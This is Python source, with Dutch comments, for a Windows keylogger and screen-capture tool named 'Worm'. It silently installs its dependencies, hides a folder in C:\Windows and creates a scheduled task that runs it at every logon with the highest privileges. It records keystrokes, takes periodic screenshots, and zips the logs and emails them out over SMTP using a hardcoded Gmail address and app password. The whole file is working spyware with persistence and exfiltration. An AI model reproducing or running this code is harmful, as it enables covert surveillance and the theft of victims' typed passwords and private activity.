import os
import smtplib
import shutil
import threading
import subprocess
import sys
import time
import zipfile
import json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

# Importeert de externe imports om het script te runnen
try:
    import keyboard
    import pyautogui
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "keyboard"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui"])
    import keyboard
    import pyautogui

# variabelen
exitEvent = threading.Event()
now = datetime.now()
dateTimeFull = now.strftime("%d/%m/%Y, %H:%M:%S")
dateTimeFolder = now.strftime("%d.%m.%Y_%H.%M.%S")
dateTimeDay = now.strftime("%d-%m-%Y")
scriptPath = os.path.abspath("C:\\Windows\\s142486_WormFolder\\Worm.pyw")
hiddenFolderPath = os.path.expanduser("C:\\Windows\\s142486_WormFolder")
path = f"C:\\Windows\\s142486_WormFolder\\Logs_{dateTimeFolder}\\keylog.txt"
logs = "C:\\Windows\\s142486_WormFolder" 
paramsPath = os.path.join(hiddenFolderPath, "Params.json")
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL = "Rvm855219@gmail.com"
PASSWORD = "lvdp dqjd txji hlyq"
message = MIMEMultipart()
message["From"] = EMAIL
message["To"] = EMAIL
message["Subject"] = os.getlogin()
message.attach(MIMEText(now.strftime("%d %B, %Y"), "plain"))

def createParamJson():
    defaultParams = {
        "TimeBetweenEachScreenshot" : 300,
        "LogKeys" : True,
        "LogScreen" : True,
        "Logging" : True,
        "EnableKillSwitch" : True   
    }
    
    if not os.path.exists(paramsPath):
        with open(paramsPath, 'w') as paramsFile:
            json.dump(defaultParams, paramsFile, indent=4)
            
createParamJson()

def loadParams():
    if os.path.exists(paramsPath):
        with open(paramsPath, 'r') as paramsFile:
            paramsContent = json.load(paramsFile)
            timeBetweenScreenshots = paramsContent.get("TimeBetweenEachScreenshot")
            logKeys = paramsContent.get("LogKeys")
            logScreen = paramsContent.get("LogScreen")
            logging = paramsContent.get("Logging")
            enableKillSwitch = paramsContent.get("EnableKillSwitch")
            return timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch
    else :
        timeBetweenScreenshots = 300
        logKeys = True
        logScreen = True
        logging = True
        enableKillSwitch = True
        return timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch
        
timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch = loadParams()

# functie die een taak maakt in taakplanner waarbij het script zichzelf uitvoert
def runOnLogin(task_name, scriptPath):
    command = [
        "schtasks",
        "/create",
        "/sc", "ONLOGON",
        "/tn", task_name,
        "/tr", f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{scriptPath}"',
        "/rl", "highest",
        "/F" 
    ]
    subprocess.run(command, capture_output=True, text=True)
    
# maakt de folder scructuur
def makeStructure():
    if not os.path.exists(hiddenFolderPath):
        os.makedirs(hiddenFolderPath)
    os.system(f'attrib +h "{hiddenFolderPath}"')
    if not os.path.exists(hiddenFolderPath+f"\\Logs_{dateTimeFolder}"):
        os.makedirs(hiddenFolderPath+f"\\Logs_{dateTimeFolder}")
    if logScreen:
        if not os.path.exists(hiddenFolderPath+f"\\Logs_{dateTimeFolder}\\ScreenLogs"):
            os.makedirs(hiddenFolderPath+f"\\Logs_{dateTimeFolder}\\ScreenLogs")

# Zips the log folder of the previeus session
def zipPrevSes(Logs):
    subdirs = [os.path.join(Logs, d) for d in os.listdir(Logs) if os.path.isdir(os.path.join(Logs, d))]
    if len(subdirs) == 2:
        if not os.path.isdir(Logs):
            pass
        oldestFolder = min(subdirs, key=os.path.getctime)
        oldestFolderName = os.path.basename(oldestFolder)

        with zipfile.ZipFile(f"{logs}\\{oldestFolderName}.zip", 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(oldestFolder):
                for file in files:
                    filePath = os.path.join(root, file)
                    arcname = os.path.relpath(filePath, start=os.path.dirname(logs))
                    zipf.write(filePath, arcname)
        shutil.rmtree(oldestFolder)
        sendMail(f"{logs}\\{oldestFolderName}.zip")
    else:
        pass

# Mail functie
def sendMail(ZipFile):
    with open(ZipFile, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f'attachment; filename="{os.path.basename(ZipFile)}"',
        )
        message.attach(part)

    os.remove(ZipFile)
    
    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    server.starttls()
    server.login(EMAIL, PASSWORD)
    server.sendmail(EMAIL, EMAIL, message.as_string())
    server.quit()

# Screenlog functie
def screenLogger():
    if logScreen and logging:
        while not exitEvent.is_set():
            timestamp = datetime.now().strftime("%H.%M.%S")
            filename = f"{hiddenFolderPath}\\Logs_{dateTimeFolder}\\ScreenLogs\\Screenlog_{timestamp}.jpg"
            screenshot = pyautogui.screenshot()
            screenshot.save(filename)
            time.sleep(timeBetweenScreenshots)  

# Keylog functie
def keyLogger():
    if logKeys and logging:
        with open(path, 'a') as dataFile:
            dataFile.write(
                "|============================================================================|\n"
                f"|         V         ! KEYBOARD LOG: {dateTimeFull} !         V         |\n"
                "|============================================================================|\n\n"
                f"<<{now.strftime('%H:%M')}>> "
            )
            key_map = {
                "space": " ",
                "windows gauche": " WINDOW ",
                "backspace": " BACKSPACE ",
                "alt": " ALT ",
                "alt gr": " ALT_GR ",
                "ctrl droite": " RIGHT_CTRL ",
                "ctrl": " CTRL ",
                "maj": " SHIFT ",
                "right shift": " RIGHT_SHIFT ",
                "verr.maj": " SHIFT_LOCK ",
                "tab": " TAB ",
                "haut": " ARROW_UP ",
                "gauche": " ARROW_LEFT ",
                "bas": " ARROW_DOWN ",
                "droite": " ARROW_RIGHT ",
                "enter": " ENTER\n",
            }
            while not exitEvent.is_set():
                try:
                    tempNow = datetime.now()
                    event = keyboard.read_event()
                    if event.event_type == keyboard.KEY_DOWN:
                        if event.name in key_map:
                            dataFile.write(key_map[event.name])
                            if event.name == "enter":
                                dataFile.write(f"<<{tempNow.strftime('%H:%M')}>> ")
                        else:
                            dataFile.write(event.name)
                        dataFile.flush()
                except Exception as e:
                    dataFile.write(f"Error: {e}\n")
                    dataFile.flush()
                    break

# Killswitch functie
def killSwitch():
    if enableKillSwitch:
        keyboard.wait("ctrl+alt+k")
        exitEvent.set()
    
runOnLogin("s142486_Worm", scriptPath)
makeStructure()
zipPrevSes(hiddenFolderPath)

keyLog_thread = threading.Thread(target=keyLogger, name="KeyLogger")
screenLog_thread = threading.Thread(target=screenLogger, name="ScreenLogger")
kill_thread = threading.Thread(target=killSwitch, name="StopKeybindMonitor")

keyLog_thread.start()
screenLog_thread.start()
kill_thread.start()

keyLog_thread.join()
screenLog_thread.join()
kill_thread.join()